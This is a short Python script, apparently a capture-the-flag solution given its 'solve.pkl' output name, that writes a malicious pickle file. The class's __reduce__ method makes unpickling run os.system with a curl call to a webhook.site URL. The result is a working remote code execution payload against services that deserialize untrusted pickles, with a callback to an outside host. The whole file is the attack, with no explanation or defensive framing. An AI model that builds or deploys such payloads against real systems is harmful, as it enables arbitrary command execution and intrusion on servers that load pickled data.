import pickle
import sys
import base64

COMMAND = "curl https://webhook.site/15c31f3e-eef4-4bc2-8b48-63b83f7a52de"

class PickleRce(object):
    def __reduce__(self):
        import os
        return (os.system,(COMMAND,))

with open("solve.pkl", "wb") as f:
    pickle.dump(PickleRce(), f)
